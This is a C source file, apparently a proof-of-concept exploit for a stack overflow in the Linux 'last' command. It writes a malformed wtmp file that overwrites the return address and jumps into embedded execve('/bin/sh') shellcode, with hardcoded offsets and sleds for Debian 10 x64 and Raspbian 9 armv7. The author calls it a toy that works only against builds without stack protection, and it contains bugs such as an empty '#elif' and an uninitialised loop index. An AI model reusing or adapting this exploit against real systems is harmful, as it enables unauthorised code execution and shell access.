#include <utmpx.h>
#include <stdio.h>
#include <pwd.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <wchar.h>
#include <unistd.h>
#include <stdint.h>

#define UT_COUNT 1

/* Description:
A toy exploit for the 'last' command is_phantom stack overflow vulnerability (last.c:633).
Generates a malformed wtmp file named mtmp (malformed-tmp)
last needs to be compiled with flags "-O0 -fno-stack-protector"
ASLR might be a thing too... basically, there is likely no practial use for this.
*/

struct Target {
  char *name;
  int arch_size; //Number of bytes to use for things like the jmp copy
  uint32_t sled; //Sled bytes to use. We can probably skip sledding once we have better offsets.
  uint32_t ip_offset; //Offset into utmpx memory where eip/rip/pc is overwritten
  uint64_t jmp; //Offset into utmpx memory where eip/rip/pc is overwritten
  unsigned char *shellcode; //shellcode to use
};

struct Target target_debian10_x64 = {
  .name = "Debian 10 x64",
  .arch_size = 8,
  .sled = 0x90909090,
  .ip_offset = 0x53,
  .jmp = 0x7fffffffd738,
  .shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", //x64 execve("/bin/sh") (https://www.exploit-db.com/shellcodes/46907)
};

struct Target target_rpi_armv7 = {
  .name = "Raspbian 9 armv7",
  .arch_size = 4,
  .sled = 0xe1a01001,
  .ip_offset = 0x3b,
  .jmp = 0x7efff448,
  .shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78", //armv7 thumb-mode execve("/bin/sh") (https://azeria-labs.com/writing-arm-shellcode/)
};

struct Target *targets[] = { 
  &target_debian10_x64,
  &target_rpi_armv7
};

int main(int argc, char **argv) {

  struct utmpx *ut;
  struct passwd *pw;
  FILE *fp;
  int n;
  int sc_size;
  int ut_size;
  struct Target *target;
 
#ifdef __arm__
  target = &target_rpi_armv7;
#elif
  target = &target_debian10_x64;
#endif

  if (argc > 1 ) {
    int target_index = atoi(argv[1]);
    int target_count = sizeof(targets)/sizeof(struct Target *);
    if (target_index >= 0 && target_index < target_count) {
      target = targets[target_index];
    } else {
      fprintf(stderr, "Available targets:\n");
      for (target_index = 0; target_index < target_count; target_index++) { 
        fprintf(stderr, "\t%d - %s\n", target_index, targets[target_index]->name);
      } 
    }
  }

  fprintf(stderr, "%s\n", target->name);
  fprintf(stderr, "Phantom stack around: %p\n", &ut);
  sc_size = strlen(target->shellcode); // ignores the null
  ut_size = sizeof(struct utmpx); // ignore the null
  fprintf(stderr, "utmpx size is: %d\n", ut_size);
  ut = calloc(UT_COUNT, ut_size);

  if (ut == NULL) return -1;

  fprintf(stderr, "Distance to ut_line is: %d\n", ((void*)&(ut->ut_line)-(void*)ut));
  fprintf(stderr, "Distance to ut_tv is: %d\n", ((void*)&(ut->ut_tv)-(void*)ut));

  //Prepare the space...
  ut->ut_type = USER_PROCESS;
  memset(ut, 0x61, ut_size*UT_COUNT);
  // Build the sled
  wmemset((wchar_t *)&ut->ut_host, target->sled, __UT_HOSTSIZE / sizeof(wchar_t));

  // Setup the shellcode mmkay 
  memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], target->shellcode, sc_size);
  fprintf(stderr, "setting rip at ut->ut_line + 0x%x\n", (target->ip_offset));
  memcpy(&ut->ut_line[target->ip_offset], &target->jmp, target->arch_size);

  //Pre-flight checks
  unsigned int bad_char_count = 0;
  for(unsigned int sc_index; ut->ut_user[sc_index] != 0x00; sc_index++) {
    if (ut->ut_user[sc_index] == 0x3a) {
      bad_char_count++;
    }
  }
  if (bad_char_count) {
    fprintf(stderr, "Unexpected number of ':' characters detected in ut->ut_user. Found %d\n", bad_char_count);
    return -1;
  }

  pw = getpwnam(ut->ut_user);
  if (pw == NULL) {
    printf("%s:x:65535:65535::/tmp:/usr/sbin/nologin\n", ut->ut_user);
    return -1;
  }

  if (access("mtmp", F_OK) != -1) {
    fprintf(stderr, "Found old mtmp, removing it...\n");
    if (remove("mtmp") != 0) {
      fprintf(stderr, "Failed to remove mtmp...\n");
      return -1;
    }
  }


  fprintf(stderr, "Opening new mtmp...\n");
  fp = fopen("mtmp", "w");
  if (fp == NULL)	{
    fprintf(stderr, "Failed to open mtmp...\n");
    return -1;
  }

  fprintf(stderr, "Writing mtmp...\n");
  n = fwrite(ut, sizeof(struct utmpx), UT_COUNT, fp);
  if (n < UT_COUNT) {
    fprintf(stderr, "Failed to write expected size!\nexpected: %d\nwrote: %d\n", UT_COUNT, n);
    return -1;
  }
  fclose(fp);
  return 0;
}
